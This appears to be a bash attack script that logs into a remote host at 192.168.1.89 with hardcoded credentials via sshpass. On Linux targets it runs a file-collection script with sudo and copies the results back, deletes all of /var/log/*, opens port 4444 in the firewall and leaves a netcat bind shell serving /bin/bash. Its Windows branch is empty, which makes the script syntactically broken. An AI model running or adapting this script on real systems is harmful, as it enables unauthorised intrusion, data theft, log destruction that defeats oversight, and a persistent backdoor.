#!/bin/bash
set -x

U="han_solo"
PASS="nerf_herder"
M="192.168.1.89"

P="./od/od.bash"
N="od"

T="/tmp/od"
Q="od"

sshpass -p "$PASS" scp "$P" "$U@$M:$T"
sshpass -p "$PASS" ssh "$U@$M" "sed -i 's/\r$//' $T && chmod +x $T"

OS=$(sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$U@$M" "$T")

if [ "$OS" = "l" ]; then
    sshpass -p "$PASS" scp "./files-detection/dtl.bash" "$U@$M:/tmp/dtl"
    sshpass -p "$PASS" ssh "$U@$M" "sed -i 's/\r$//' /tmp/dtl && chmod +x /tmp/dtl && cd /tmp && echo "$PASS" | sudo -S ./dtl && chmod -R 777 /tmp/li"
    sshpass -p "$PASS" scp -r "$U@$M:/tmp/li" .
    sshpass -p "$PASS" ssh "$U@$M" "echo "$PASS" | sudo -S rm -R -f /tmp/dtl /tmp/li /tmp/od /var/log/* "

    sshpass -p "$PASS" ssh "$U@$M" "echo "$PASS" | sudo -S ufw allow 4444"
    sshpass -p "$PASS" ssh "$U@$M" "echo "$PASS" | sudo -S ufw enable"
    sshpass -p "$PASS" ssh "$U@$M" "echo "$PASS" | sudo -S iptables -A INPUT -p tcp --dport 4444 -j ACCEPT"

    sshpass -p "$PASS" ssh "$U@$M" "nc -l -p 4444 -e /bin/bash >/dev/null 2>&1 &"
    #nc "$M" 4444
fi

if [ "$OS" = "w" ]; then

fi